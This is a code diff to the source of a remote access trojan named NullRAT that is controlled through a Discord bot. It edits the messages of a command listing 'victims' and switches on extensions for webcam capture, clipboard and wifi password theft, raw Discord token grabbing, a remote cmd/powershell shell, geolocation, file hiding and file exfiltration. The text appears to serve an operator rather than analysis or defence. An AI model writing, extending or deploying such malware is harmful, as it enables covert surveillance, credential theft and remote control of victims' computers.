@@ -115,9 +115,9 @@ async def on_ready():
 async def listvictims(ctx):
     """Lists all victim identifiers accessible by NullRAT"""
     await ctx.channel.send( 
-        embed=discord.Embed(title=f"The identifier for {os.getenv('username')} is: {client.identifier}") 
+        embed=discord.Embed(title=f"The identifier for {os.getenv('username')}:", description=client.identifier) 
     )
-    await ctx.response.send_message("__Checked all available victims:__")
+    await ctx.response.send_message("Checked all available victims:\n_ _")
 
 @client.slash_command()
 async def shutdown(ctx, victim):
@@ -164,6 +164,17 @@ class closeall_confirm(discord.ui.View):
 ############### Bot Extensions
 
 extensions = (
+    "hide",           # /hidefile & /unhidefile
+    "wifi",           # /wifilist & /wifipass
+    "shell",          # /cmd & /powershell
+    "getenv",         # /get_environment
+    "webcam",         # /get_webcam
+    "clipboard",      # /get_clipboard
+    # "startup",        # /startup
+    "geolocate",      # /get_geolocation
+    "directory",      # /get_currentdir & /set_currentdir & /list_directory & /list_rawdir
+    "rawtokens",      # /raw_tokens & /raw_discord
+    "sendfiles",      # /sendfiles
     "systeminfo",     # /get_systeminfo
     "screenshot",     # /get_screenshot
     "receivefiles",   # /receivefiles
@@ -181,15 +192,4 @@ def is_connected():
 while is_connected() == False: 0
 client.run(bot_token)
 ############### Bot Startup
-
-    # "hide",           # /hidefile & /unhidefile
-    # "wifi",           # /wifilist & /wifipass
-    # "shell",          # /cmd & /powershell
-    # "getenv",         # /get_environment
-    # "webcam",         # /get_webcam
-    # "startup",        # /startup
-    # "geolocate",      # /get_geolocation
-    # "directory",      # /get_currentdir & /change_directory & /list_directory
-    # "rawtokens",      # /raw_tokens & /raw_discord
-    # "sendfiles",      # /sendfiles
 
